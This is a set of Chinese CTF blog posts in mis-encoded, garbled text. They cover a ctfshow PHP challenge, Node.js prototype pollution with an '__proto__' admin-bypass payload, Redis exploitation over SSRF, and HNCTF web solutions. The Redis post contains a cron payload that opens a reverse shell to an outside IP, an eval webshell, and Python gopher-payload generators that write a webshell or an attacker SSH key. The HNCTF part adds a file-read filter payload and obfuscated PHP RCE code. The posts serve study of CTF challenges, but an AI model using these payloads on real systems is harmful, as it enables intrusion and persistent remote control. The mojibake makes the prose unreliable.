è¿™é‡Œé¢åˆåŒ…å«äº†ä¸€ä¸ªctfshow.php\nè€Œä¸”çœ‹äº†ä¸€ä¸‹,ctfshow.phpçš„è·¯å¾„æ˜¯/var/www/html/framework/ctfshow.php\nä¸‹è½½ä¸‹æ¥æºç æ˜¯è¿™æ ·çš„:\n\u0026lt;?php\rclass ctfshow{\rprivate static $hook;\rpublic static function run(){\r$action = self::get_action();\r$method = self::get_method();\rself::$hook=new hook($action,$method,self::get_args());\rself::$hook-\u0026gt;$method();\r}\rpublic static function get_action(){\rif(isset($_COOKIE[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; preg_match(\u0026#39;/^[a-z]+$/\u0026#39;, $_COOKIE[\u0026#39;a\u0026#39;])){\rreturn $_COOKIE[\u0026#39;a\u0026#39;];\r}else{\rreturn DEFAULT_ACTION;\r}\r}\rpublic static function get_method(){\rif(isset($_COOKIE[\u0026#39;m\u0026#39;]) \u0026amp;\u0026amp; preg_match(\u0026#39;/^[a-z]+$/\u0026#39;, $_COOKIE[\u0026#39;m\u0026#39;])){\rreturn $_COOKIE[\u0026#39;m\u0026#39;];\r}else{\rreturn DEFAULT_METHOD;\r}\r}\rpublic static function get_args(){\r$ret = array();\rif($_COOKIE[DEFAULT_COOKIE]!=null){\r$args = $_COOKIE[DEFAULT_COOKIE];\rif($args!=\u0026#39;\u0026#39; \u0026amp;\u0026amp; strpos($args, \u0026#39;|\u0026#39;)\u0026gt;0){\r$ret= explode(\u0026#39;|\u0026#39;, $args);\r}\r}\rreturn $ret;\r}\r}\u0026lt;script language=JavaScript\u0026gt; location.replace(location.href);\u0026lt;/script\u0026gt; åˆ°è¿™é‡Œå°±æ²¡ä»€ä¹ˆæ€è·¯äº†\u0026hellip;..åé¢æœ‰wpäº†å†å­¦ä¹ å­¦ä¹ \n","date":"2023-06-25","externalUrl":null,"permalink":"/posts/2023/06/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF%E5%90%83%E7%93%9C%E6%9D%AF/","section":"Posts","summary":"","title":"CTFshow-æœˆé¥¼æ¯\u0026åƒç“œæ¯","type":"posts"},{"content":"\rç»§æ‰¿ä¸åŸå‹é“¾ #\råœ¨JavaScriptä¸­åªæœ‰ä¸€ç§ç»“æ„ï¼šå¯¹è±¡ï¼ˆè¿å‡½æ•°ä¹Ÿæ˜¯ä¸€ç§å¯¹è±¡ï¼‰ã€‚\næ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ª_ç§æœ‰å±æ€§_ï¼ŒæŒ‡å‘å¦ä¸€ä¸ªåä¸ºâ€œåŸå‹â€ï¼ˆprototypeï¼‰çš„å¯¹è±¡ã€‚\nåŸå‹å¯¹è±¡ä¹Ÿæœ‰è‡ªå·±çš„ä¸€ä¸ªåŸå‹ï¼Œä¸€å±‚ä¸€å±‚çš„ç›´åˆ°ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ä¸º_NULL_ï¼ŒNullå¤„äºåŸå‹é“¾çš„é¡¶ç«¯ï¼Œæˆ–è€…è¯´åŸå‹é“¾çš„æœ€åä¸€ç¯ã€‚\nç»§æ‰¿å±æ€§ #\rJavaScript å¯¹è±¡æœ‰ä¸€ä¸ªæŒ‡å‘ä¸€ä¸ªåŸå‹å¯¹è±¡çš„é“¾ã€‚\nå½“è¯•å›¾è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼Œå®ƒä¸ä»…ä»…åœ¨è¯¥å¯¹è±¡ä¸Šæœå¯»ï¼Œè¿˜ä¼šæœå¯»è¯¥å¯¹è±¡çš„åŸå‹ï¼Œä»¥åŠåŸå‹çš„åŸå‹ï¼Œä¾æ¬¡å±‚å±‚å‘ä¸Šæœç´¢ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåå­—åŒ¹é…çš„å±æ€§æˆ–åˆ°è¾¾åŸå‹é“¾çš„æœ«å°¾ã€‚\n__proto__å’Œprototype #\råœ¨JavaScriptä¸­ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåä¸º__proto__çš„å†…ç½®å±æ€§ï¼Œå®ƒæŒ‡å‘è¯¥å¯¹è±¡çš„åŸå‹ï¼Œç±»ä¼¼äºæŒ‡é’ˆæ¦‚å¿µã€‚\nåŒæ—¶ï¼Œæ¯ä¸ªå‡½æ•°ä¹Ÿéƒ½æœ‰ä¸€ä¸ªåä¸ºÂ prototypeï¼ˆåŸå‹ï¼‰çš„å±æ€§ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…å«æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡åº”è¯¥å…·æœ‰çš„å±æ€§å’Œæ–¹æ³•ã€‚\nä¸‹é¢æ˜¯ä¸€æ®µä»£ç ä¸¾ä¾‹\nfunction Person(name) {\rthis.name = name;\r}//ä¸€ä¸ªå¸¦å‚æ„é€ å‡½æ•°ï¼Œä¼ å…¥nameå¹¶èµ‹å€¼\rPerson.prototype.greet = function() {\rconsole.log(`Hello, my name is ${this.name}`);//å°†prototypeä¸Šçš„greetè®¾ç½®ä¸ºä¸€ä¸ªæ‰“æ‹›å‘¼çš„å‡½æ•°\r};\rconst person1 = new Person(\u0026#39;Alice\u0026#39;);\rperson1.greet(); // è¾“å‡º \u0026#34;Hello, my name is Alice\u0026#34; å½“åˆ›å»ºäº†person1çš„æ—¶å€™ï¼Œperson1é‡Œå¹¶æ²¡æœ‰greetï¼Œä»–ä¼šæ²¿ç€åŸå‹é“¾æœç´¢å¹¶ç»§æ‰¿prototypeä¸­çš„greetå‡½æ•°ã€‚\nçœ‹çœ‹è¿™æ®µä»£ç çš„æ‰§è¡Œæƒ…å†µ\nä»è¿™é‡Œå°±å¯ä»¥çœ‹å‡ºï¼Œprototypeæ˜¯ç±»Personçš„ä¸€ä¸ªå±æ€§ï¼Œæ‰€æœ‰ç”¨ç±»Personè¿›è¡Œå®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½ä¼šæ‹¥æœ‰prototypeçš„å…¨éƒ¨å†…å®¹ã€‚\næ€»ç»“ï¼š\n1ã€prototypeæ˜¯ä¸€ä¸ªç±»çš„å±æ€§ï¼Œæ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰prototypeä¸­çš„å±æ€§å’Œæ–¹æ³•\r2ã€ä¸€ä¸ªå¯¹è±¡çš„__proto__å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„prototypeå±æ€§ æˆ‘åœ¨ç½‘ä¸Šæ‰¾äº†ä¸¤å¼ å›¾\nè¿™ä¸€å¼ æ˜¯å…³äº__proto__\nå¯ä»¥çœ‹åˆ° f1 çš„__proto__æŒ‡å‘äº†Foo.prototypeï¼Œå› ä¸ºf1æ˜¯ä»Fooè¿™ä¸ªå‡½æ•°é‡Œnewçš„ï¼Œæ‰€ä»¥ä»–çš„åŸå‹æ˜¯foo\nFoo()çš„__proto__æŒ‡å‘äº†Function.prototypeï¼Œå› ä¸ºä»–æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥æŒ‡å‘çš„å‡½æ•°çš„åŸå‹\nä¸‹é¢è¿™å¼ å›¾æ˜¯å…³äºprototypeçš„\nå…³äºprototypeï¼Œå®ƒæ˜¯å‡½æ•°æ‰€ç‹¬æœ‰çš„ï¼Œå®ƒæ˜¯ä»ä¸€ä¸ªå‡½æ•°æŒ‡å‘ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒçš„å«ä¹‰æ˜¯å‡½æ•°çš„åŸå‹å¯¹è±¡\n__proto__å’Œprototypeçš„å…³ç³»å¯ä»¥ç”¨ä¸‹å›¾è¡¨ç¤º\nåŸå‹é“¾æ±¡æŸ“ #\rå…ˆä¸¾ä¸ªä¾‹å­\nvar a = {number : 520}\rvar b = {number : 1314}\rb.__proto__.number=520 var c= {}\rc.number è¿™æ®µä»£ç çš„æ‰§è¡Œæƒ…å†µå¦‚ä¸‹\nè¿™æ®µä»£ç ä¸­çš„ C æˆ‘æ˜¯æ²¡æœ‰èµ‹å€¼çš„ï¼Œä½†æ˜¯æ‰§è¡Œå‡ºæ¥æ˜¯520\nåŸå› æ˜¯ï¼Œbçš„protoå…¶å®æŒ‡å‘çš„å°±æ˜¯objectçš„prototype\nåœ¨è¿™é‡Œå°†objectç±»é‡Œæ‰€æœ‰å¯¹è±¡çš„numberå±æ€§çš„å€¼éƒ½è®¾ç½®ä¸ºäº†520\næ•ˆæœå°±å¦‚åŒä¸‹é¢è¿™å¼ å›¾\nä½†æ˜¯è¿™æ—¶è¾“å‡ºbçš„å€¼å°±æ˜¯1314ï¼Œå› ä¸ºåœ¨bè‡ªå·±çš„å±æ€§ä¸­èƒ½å¤Ÿæ‰¾åˆ°numberå±æ€§\nç³»ç»Ÿåªæœ‰åœ¨æ‰¾ä¸åˆ°çš„æ—¶å€™æ‰ä¼šæ²¿ç€åŸå‹é“¾æœç´¢ï¼Œ\nä¸‹é¢æ¥å®æˆ˜æ¼”ç»ƒä¸€ä¸‹\nCatCTF 2022 wife #\ræºç å¦‚ä¸‹ï¼š\napp.post(\u0026#39;/register\u0026#39;, (req, res) =\u0026gt; {\rlet user = JSON.parse(req.body)\rif (!user.username || !user.password) {\rreturn res.json({ msg: \u0026#39;empty username or password\u0026#39;, err: true })\r}\rif (users.filter(u =\u0026gt; u.username == user.username).length) {\rreturn res.json({ msg: \u0026#39;username already exists\u0026#39;, err: true })\r}\rif (user.isAdmin \u0026amp;\u0026amp; user.inviteCode != INVITE_CODE) {\ruser.isAdmin = false\rreturn res.json({ msg: \u0026#39;invalid invite code\u0026#39;, err: true })\r}\rlet newUser = Object.assign({}, baseUser, user)\rusers.push(newUser)\rres.json({ msg: \u0026#39;user created successfully\u0026#39;, err: false })\r}) è¿™é‡Œå¯ä»¥åˆ©ç”¨çš„ç‚¹å°±æ˜¯object.assignè¿™ä¸ªå‡½æ•°\nObject.assign()Â æ–¹æ³•ç”¨äºå°†æ‰€æœ‰å¯æšä¸¾å±æ€§çš„å€¼ä»ä¸€ä¸ªæˆ–å¤šä¸ªæºå¯¹è±¡å¤åˆ¶åˆ°ç›®æ ‡å¯¹è±¡ã€‚å®ƒå°†è¿”å›ç›®æ ‡å¯¹è±¡ã€‚\nObject.assign(target, source1ï¼Œsource2ï¼Œsource3\u0026hellip;..)\nè¯¥å‡½æ•°ä»source1åˆ°sourceNä¸­å°†å±æ€§æ·»åŠ æˆ–è¦†ç›–åˆ°targetä¸­\nconst object1 = {\ra: 1,\rb: 2,\rc: 3\r};\rconst object2 = Object.assign({c: 4, d: 5}, object1);\rconsole.log(object2.c, object2.d);\r// expected output: 3 5ç›¸å½“äºæ˜¯æ‹¬å·å†…æ‰€æœ‰å˜é‡çš„é›†åˆä½“ç»„æˆçš„object2 å¾ˆæ˜æ˜¾è¿™é“é¢˜æ˜¯è¦è·å¾—adminæƒé™ï¼Œä½†æ˜¯æºç é‡Œè®¾ç½®äº†isAdminä¸ºfalseï¼Œå°±è¦è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“\næŠ“ä¸ªåŒ…å¦‚ä¸‹\nå¯ä»¥ä½¿ç”¨protoå°†æ‰€æœ‰ç±»çš„isAdminè®¾ç½®ä¸ºtrue\né‚£ä¹ˆéšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·çš„æ—¶å€™éƒ½èƒ½é€šè¿‡éªŒè¯\nå…³é”®å°±åœ¨äº\n\u0026#34;__proto__\u0026#34;:{\u0026#34;isAdmin\u0026#34;:true} å‚è€ƒé“¾æ¥ï¼š\næµ…æCTFä¸­çš„Node.jsåŸå‹é“¾æ±¡æŸ“ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·\nå¸®ä½ å½»åº•ææ‡‚JSä¸­çš„prototypeã€__proto__ä¸constructorï¼ˆå›¾è§£ï¼‰_ç é£_CCçš„åšå®¢-CSDNåšå®¢\nprototypeä¸__proto__çš„åŒºåˆ«å’Œå…³ç³»_prototypeå’Œ__proto___ç™½å°ç™½ç¬çš„åšå®¢-CSDNåšå®¢\n","date":"2023-06-24","externalUrl":null,"permalink":"/posts/2023/06/%E5%85%B3%E4%BA%8Enodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","section":"Posts","summary":"","title":"å…³äºNodejsåŸå‹é“¾æ±¡æŸ“","type":"posts"},{"content":"\rä»€ä¹ˆæ˜¯Redisï¼Ÿ #\rRedisæ˜¯ç°åœ¨æœ€å—æ¬¢è¿çš„NoSQLæ•°æ®åº“ä¹‹ä¸€ï¼ŒRedisæ˜¯ä¸€ä¸ªä½¿ç”¨ANSI Cç¼–å†™çš„å¼€æºã€åŒ…å«å¤šç§æ•°æ®ç»“æ„ã€æ”¯æŒç½‘ç»œã€åŸºäºå†…å­˜ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨æ•°æ®åº“ã€‚\nRESPåè®® #\rRESP åè®®æ˜¯ redis æœåŠ¡ä¹‹é—´æ•°æ®ä¼ è¾“çš„é€šä¿¡åè®®ï¼Œredis å®¢æˆ·ç«¯å’Œ redis æœåŠ¡ç«¯ä¹‹é—´é€šä¿¡ä¼šé‡‡å– RESP åè®®\nå› æ­¤æˆ‘ä»¬åç»­æ„é€  payload æ—¶ä¹Ÿéœ€è¦è½¬æ¢æˆ RESP åè®®çš„æ ¼å¼ã€‚\nRESPåœ¨Redisä¸­ç”¨ä½œè¯·æ±‚ - å“åº”åè®®çš„æ–¹å¼å¦‚ä¸‹ï¼š\nå®¢æˆ·ç«¯å°†å‘½ä»¤ä½œä¸ºBulk Stringsçš„RESPæ•°ç»„å‘é€åˆ°RedisæœåŠ¡å™¨ã€‚\næœåŠ¡å™¨æ ¹æ®å‘½ä»¤å®ç°å›å¤ä¸€ç§RESPç±»å‹ã€‚\nRESPåè®®çš„æ ¼å¼å¦‚ä¸‹ï¼š\n*1\r$8\rflushall\r*3\r$3\rset\r$1\r1\r$64\r*/1 * * * * bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.230.132/1234 0\u0026gt;\u0026amp;1\r*4\r$6\rconfig\r$3\rset\r$3\rdir\r$16\r/var/spool/cron/\r*4\r$6\rconfig\r$3\rset\r$10\rdbfilename\r$4\rroot\r*1\r$4\rsave\rquit *n ä»£è¡¨äº†ä¸€æ¡å‘½ä»¤çš„å¼€å§‹ï¼Œnè¡¨ç¤ºè¯¥æ¡å‘½ä»¤ç”±nä¸ªå­—ç¬¦ä¸²ç»„æˆ\n$n è¡¨ç¤ºäº†è¯¥å­—ç¬¦ä¸²ç”±nä¸ªå­—ç¬¦ç»„æˆ\ngopheråè®® #\rå½“æ¢æµ‹å†…ç½‘æˆ–æ‰§è¡Œå‘½ä»¤æ—¶éœ€è¦å‘é€Â POST è¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ gopher åè®®\nåè®®æ ¼å¼\ngopher://\u0026lt;host\u0026gt;:\u0026lt;port\u0026gt;/\u0026lt;gopher-path\u0026gt; è¿™é‡Œçš„gopher-pathå°±æ˜¯ç›¸å½“äºè¦å‘é€çš„æ•°æ®åŒ…ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦æ„é€ çš„RESPåè®®\næ³¨æ„ï¼šgopheråè®®ä½¿ç”¨æ—¶ï¼Œä¼šåå™¬æ‰gopher-pathçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œé€šå¸¸ç”¨ä¸ªä¸‹åˆ’çº¿æ¥å¡«å……è¿™ä¸ªå­—ç¬¦\nç»å¯¹è·¯å¾„å†™å…¥webshell #\råº”ç”¨æ¡ä»¶ï¼š\nredisæœ‰rootæƒé™\nçŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„\né¦–å…ˆè¦æ„é€ rediså‘½ä»¤\nflushall //ç”¨äºæ¸…ç©ºæ•´ä¸ªredisæœåŠ¡å™¨çš„æ‰€æœ‰æ•°æ®ï¼ˆåˆ é™¤æ‰€æœ‰æ•°æ®åº“çš„æ‰€æœ‰ key ï¼‰\rset 1 \u0026#39;\u0026lt;?php eval($_GET[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39; //è®¾ç«‹ä¸€ä¸ªé”®å€¼å¯¹\rconfig set dir /var/www/html //æŒ‡å®šæœ¬åœ°æ•°æ®åº“å­˜æ”¾ç›®å½•\rconfig set dbfilename shell.php //æŒ‡å®šæœ¬åœ°æ•°æ®åº“æ–‡ä»¶åï¼Œé»˜è®¤å€¼ä¸º dump.rdb\rsave æˆ‘ä»¬è¦å°†è¿™æ¡å‘½ä»¤è½¬åŒ–ä¸ºRESPåè®®çš„æ ¼å¼å†ç»“åˆgopheråè®®è¾¾åˆ°å†™å…¥shellçš„ç›®çš„\nè´´ä¸€ä¸ªè½¬æ¢è„šæœ¬ï¼š\n#!/usr/bin/env python\r# -*-coding:utf-8-*-\rimport urllib\rprotocol=\u0026#34;gopher://\u0026#34; # ä½¿ç”¨çš„åè®® ip=\u0026#34;\u0026#34;\rport=\u0026#34;\u0026#34; # ç›®æ ‡redisçš„ç«¯å£å· shell=\u0026#34;\\n\\n\u0026lt;?php eval($_GET[\\\u0026#34;cmd\\\u0026#34;]);?\u0026gt;\\n\\n\u0026#34;\rfilename=\u0026#34;shell.php\u0026#34; # shellçš„åå­— path=\u0026#34;/var/www/html\u0026#34; # å†™å…¥çš„è·¯å¾„\rpasswd=\u0026#34;\u0026#34; # å¦‚æœæœ‰å¯†ç  åˆ™å¡«å…¥\r# æˆ‘ä»¬çš„æ¶æ„å‘½ä»¤ cmd=[\u0026#34;flushall\u0026#34;,\r\u0026#34;set 1 {}\u0026#34;.format(shell.replace(\u0026#34; \u0026#34;,\u0026#34;${IFS}\u0026#34;)),\r\u0026#34;config set dir {}\u0026#34;.format(path),\r\u0026#34;config set dbfilename {}\u0026#34;.format(filename),\r\u0026#34;save\u0026#34;\r]\rif passwd:\rcmd.insert(0,\u0026#34;AUTH {}\u0026#34;.format(passwd))\rpayload=protocol+ip+\u0026#34;:\u0026#34;+port+\u0026#34;/_\u0026#34;\rdef redis_format(arr):\rCRLF=\u0026#34;\\r\\n\u0026#34;\rredis_arr = arr.split(\u0026#34; \u0026#34;)\rcmd=\u0026#34;\u0026#34;\rcmd+=\u0026#34;*\u0026#34;+str(len(redis_arr))\rfor x in redis_arr:\rcmd+=CRLF+\u0026#34;$\u0026#34;+str(len((x.replace(\u0026#34;${IFS}\u0026#34;,\u0026#34; \u0026#34;))))+CRLF+x.replace(\u0026#34;${IFS}\u0026#34;,\u0026#34; \u0026#34;)\rcmd+=CRLF\rreturn cmd\rif __name__==\u0026#34;__main__\u0026#34;:\rfor x in cmd:\rpayload += urllib.quote(redis_format(x))\rprint payload\rprint urllib.quote(\u0026#34;äºŒæ¬¡urlç¼–ç åçš„ç»“æœ:\\n\u0026#34; + payload) ç”¨è¿™ä¸ªè„šæœ¬ç”Ÿæˆçš„è¯åº”è¯¥åœ¨æœ€ååŠ ä¸€ä¸ª%0Aä½œä¸ºè¯­å¥çš„æˆªæ–­ï¼Œä¸ç„¶å°±æ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚\nRediså†™å…¥sshå…¬é’¥ #\ræ¡ä»¶ï¼šredisæœ‰rootæƒé™\nåŸç†ï¼šé€šè¿‡åœ¨ç›®æ ‡æœºå™¨ä¸Šå†™å…¥ ssh å…¬é’¥ï¼Œç„¶åä¾¿å¯ä»¥é€šè¿‡ ssh å…å¯†ç ç™»å½•ç›®æ ‡æœºå™¨\né¦–å…ˆè¦ç”Ÿæˆ ssh å…¬/ç§é’¥\næ‰§è¡Œè¿™æ®µå‘½ä»¤\nssh-keygen -t rsa ä¼šåœ¨ /root/.ssh/ç›®å½•ä¸‹ç”Ÿæˆssh å…¬/ç§é’¥\næˆ‘ä»¬æƒ³è¦æ„é€ çš„payloadï¼š\nflushall\rset 1 \u0026#39;id_rsa.pub é‡Œçš„å†…å®¹\u0026#39;\rconfig set dir \u0026#39;/root/.ssh/\u0026#39;\rconfig set dbfilename authorized_keys\rsave åˆ©ç”¨ä»¥ä¸‹è„šæœ¬å°†payloadè½¬åŒ–ä¸ºRESPçš„æ ¼å¼ï¼š\nimport urllib\rprotocol=\u0026#34;gopher://\u0026#34;\rip=\u0026#34;\u0026#34;\rport=\u0026#34;\u0026#34;\rsshpublic_key = \u0026#34;\\n\\nid_rsa.pub é‡Œçš„å†…å®¹\\n\\n\u0026#34;\rfilename=\u0026#34;authorized_keys\u0026#34;\rpath=\u0026#34;/root/.ssh/\u0026#34;\rpasswd=\u0026#34;\u0026#34;\rcmd=[\u0026#34;flushall\u0026#34;,\r\u0026#34;set 1 {}\u0026#34;.format(sshpublic_key.replace(\u0026#34; \u0026#34;,\u0026#34;${IFS}\u0026#34;)),\r\u0026#34;config set dir {}\u0026#34;.format(path),\r\u0026#34;config set dbfilename {}\u0026#34;.format(filename),\r\u0026#34;save\u0026#34;\r]\rif passwd:\rcmd.insert(0,\u0026#34;AUTH {}\u0026#34;.format(passwd))\rpayload=protocol+ip+\u0026#34;:\u0026#34;+port+\u0026#34;/_\u0026#34;\rdef redis_format(arr):\rCRLF=\u0026#34;\\r\\n\u0026#34;\rredis_arr = arr.split(\u0026#34; \u0026#34;)\rcmd=\u0026#34;\u0026#34;\rcmd+=\u0026#34;*\u0026#34;+str(len(redis_arr))\rfor x in redis_arr:\rcmd+=CRLF+\u0026#34;$\u0026#34;+str(len((x.replace(\u0026#34;${IFS}\u0026#34;,\u0026#34; \u0026#34;))))+CRLF+x.replace(\u0026#34;${IFS}\u0026#34;,\u0026#34; \u0026#34;)\rcmd+=CRLF\rreturn cmd\rif __name__==\u0026#34;__main__\u0026#34;:\rfor x in cmd:\rpayload += urllib.quote(redis_format(x))\rprint payload\rprint urllib.quote(\u0026#34;äºŒæ¬¡urlç¼–ç åçš„ç»“æœ:\\n\u0026#34; + payload) é…åˆgopherè®¿é—®ä¸€ä¸‹ï¼Œæ­¤æ—¶è¦æ³¨æ„é¶æœºçš„sshæœåŠ¡ä¸€å®šè¦æ˜¯å¼€å¯çš„çŠ¶æ€ã€‚\nå†™å…¥å°±å¯ä»¥é€šè¿‡sshè¿æ¥é¶æœºè·å¾—shellæƒé™\nsshå…¬é’¥å’Œç§é’¥ #\rå¦‚æœè¦ä½¿ç”¨Â ssh è¿æ¥æœåŠ¡ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦ç”Ÿæˆç§é’¥å’Œå…¬é’¥ï¼Œç§é’¥ç•™åœ¨æœ¬åœ°ï¼Œå…¬é’¥ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œè¿™æ ·åœ¨è¿æ¥æ—¶ï¼Œæ‰å¯ä»¥åšè®¤è¯æœåŠ¡ã€‚ åˆå§‹æ—¶ï¼Œå¯¹äº linux ç³»ç»Ÿä¸Šçš„æ¯ä¸€ä¸ªç”¨æˆ·ï¼Œå¯¹åº”çš„ home ç›®å½•ä¸‹éƒ½æœ‰ä¸€ä¸ª .ssh éšè—ç›®å½• ï¼Œå°±æ˜¯ç”¨æ¥å­˜æ”¾ç”Ÿæˆçš„ç§˜é’¥å’Œç§é’¥çš„ å¦‚æœæˆåŠŸçš„è¯ï¼Œä¹‹åè¿æ¥ï¼Œå°±ä¸å¿…ä½¿ç”¨å¯†ç æ–¹å¼ã€‚\nå‚è€ƒé“¾æ¥\nSSRF + Redis åˆ©ç”¨æ–¹å¼å­¦ä¹ ç¬”è®° - 1ndex- - åšå®¢å›­ (cnblogs.com)\næµ…æRedisä¸­SSRFçš„åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)\n","date":"2023-06-19","externalUrl":null,"permalink":"/posts/2023/06/redis%E4%B8%8Essrf/","section":"Posts","summary":"","title":"æµ…è°ˆRedisä¸SSRF","type":"posts"},{"content":"","date":"2023-06-17","externalUrl":null,"permalink":"/tags/hnctf/","section":"Tags","summary":"","title":"Hnctf","type":"tags"},{"content":"\rweek1 #\r2048 #\rä¸€ä¸ª2048å°æ¸¸æˆï¼Œå…ˆçœ‹çœ‹æºç \nåœ¨æºç ä¸­çœ‹åˆ°æ¸¸æˆçš„jsæ–‡ä»¶\næ‰¾æ‰¾çœ‹æœ‰æ²¡æœ‰flag\næ‰¾åˆ°è¿™ä¸€æ®µä»£ç \nåŸæ¥è¦è¶…è¿‡20000åˆ†æ‰å¼¹å‡ºflagï¼Œè¿™é‡Œç›´æ¥æŠŠä»£ç æ”¾åˆ°æ§åˆ¶å°è¿è¡Œï¼Œå¼¹å‡ºflag\nInteresting_include #\ræ–‡ä»¶åŒ…å«,æ²¡ä»€ä¹ˆéš¾åº¦\npayload: ?filter=php://filter/convert.base64-encode/resource=flag.php ç„¶åå°†å¾—åˆ°çš„å­—ç¬¦ä¸²æ‹¿å»base64è§£ç å³å¯\neasy_upload #\réšä¾¿ä¸Šä¼ ä¸€ä¸ª1.phpï¼Œç„¶åç”¨èšå‰‘è¿æ¥ï¼Œåœ¨æ ¹ç›®å½•ä¸‹å¾—åˆ°flag\neasy_html #\ré¥¼å¹²ï¼Ÿé‚£å°±æ˜¯cookieå’¯ï¼Œåœ¨æµè§ˆå™¨é‡Œçœ‹çœ‹\nåœ¨è¯·æ±‚å¤´é‡Œçœ‹åˆ°flagçš„ä¿¡æ¯ï¼Œè®¿é—®è¿™ä¸ªphpæ–‡ä»¶\néšä¾¿è¾“ä¸€ä¸ªæ‰‹æœºå·ç ï¼Œä½†æ˜¯éƒ½æ²¡ä»€ä¹ˆç”¨ï¼Œäºæ˜¯å®¡æŸ¥ä¸€ä¸‹æºç \nè°çš„ç”µè¯å·åªæœ‰10ä½å•Šï¼Ÿåº”è¯¥è¦ä¿®æ”¹ä¸€ä¸‹å˜æˆ11ä½\nä¿®æ”¹è¿‡åéšä¾¿è¾“11ä½æ•°å­—å°±å¼¹å‡ºflagï¼Œå¾ˆåŸºæœ¬çš„å‰ç«¯é—®é¢˜\nWhat is web #\rä¸Šæºç \nåœ¨æ³¨é‡Šé‡Œé¢çœ‹åˆ°flagï¼Œbase64è§£å¯†ä¸€ä¸‹å°±è¡Œäº†\nInteresting_http #\råˆæ˜¯ä¸€é“httpçš„é¢˜\né‚£å°±ç»™ä»–ä¸€ä¸ªwantå§\nä¸æ˜¯ç®¡ç†å‘˜èº«ä»½ï¼ŒæŠ“ä¸ªåŒ…çœ‹çœ‹\nåŸæ¥åœ¨cookieé‡Œé¢è®¾ç½®äº†ç®¡ç†å‘˜èº«ä»½\nåªéœ€è¦ä¿®æ”¹ä¸º user=admin å³å¯ç»•è¿‡\nä¸åœ¨æœ¬åœ°ï¼Œé‚£ä¹ˆå°±åŠ ä¸€ä¸ªXFFå¤´å§\nX-Forwarded-For:127.0.0.1 Challenge_rce #\ræºç é‡Œç»™å‡ºæç¤ºï¼Œè¦GETä¸€ä¸ªhint\næ— å‚æ•°RCEä¸€èˆ¬æœ‰ä¸‰ç§æ€è·¯ï¼Œè‡ªå¢ã€å–åã€å¼‚æˆ–\nè¿™é‡Œå°±è¯•è¯•è‡ªå¢å§\nç”±äºphpå˜é‡æ²¡æœ‰èµ‹å€¼æ—¶é»˜è®¤æ˜¯é›¶ï¼Œä¸”æ•°ç»„ä¸å­—ç¬¦ä¸²æ‹¼æ¥æ—¶è¿”å›Array\n\u0026lt;?php\r$_=_.[];\recho $_; æ‰§è¡Œç»“æœå°±æ˜¯è¾“å‡ºä¸€ä¸ªArrayï¼ˆæˆ‘ç”¨çš„php5ä¼šæŠ¥é”™ï¼Œphp7å°±ä¸ä¼šï¼‰\nç„¶åç”¨å…¶ä¸­çš„å­—æ¯è¿›è¡Œè‡ªå¢æ„é€ æ‰§è¡Œè¯­å¥\nè¿™æ ·æ˜¯èƒ½æ„é€ å‡ºGETçš„ï¼Œä½†æ˜¯é•¿åº¦ä¼šè¶…è¿‡é™åˆ¶ï¼Œå¾—æƒ³æƒ³å…¶å®ƒçš„åŠæ³•\nå¯ä»¥ä½¿ç”¨chr()å‡½æ•°ï¼Œå› ä¸ºæ²¡æœ‰å¯¹æ•°å­—è¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æ•°å­—è·å¾—å­—æ¯\nè·å¾—chrå‡½æ•°åå°±å¾ˆå®¹æ˜“å¾—åˆ°GETï¼Œå¦‚å›¾ä¸‹\n\u0026lt;?php\r$_=[]._;\r$__=$_[1];\r$_=$_[0];\r$_++;\r$_1=++$_;\r$_++;\r$_++;\r$_++;\r$_++;\r$_=$_1.++$_.$__;//chr\r$_=_.$_(71).$_(69).$_(84);//GET\r$$_[1]($$_[2]); ç›¸å½“äºåœ¨æœ€åæ„é€ äº†ä¸€ä¸ª $_GET[_]($_GET[__])\nä¼ ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªä½œä¸ºå‡½æ•°åï¼Œå¦ä¸€ä¸ªä½œä¸ºå‘½ä»¤\npostçš„æ—¶å€™æ³¨æ„å°†rceè¿›è¡Œurlencodeç¼–ç ä¸€ä¸‹\nå¾—åˆ°flag\nweek2 #\rez_SSTI 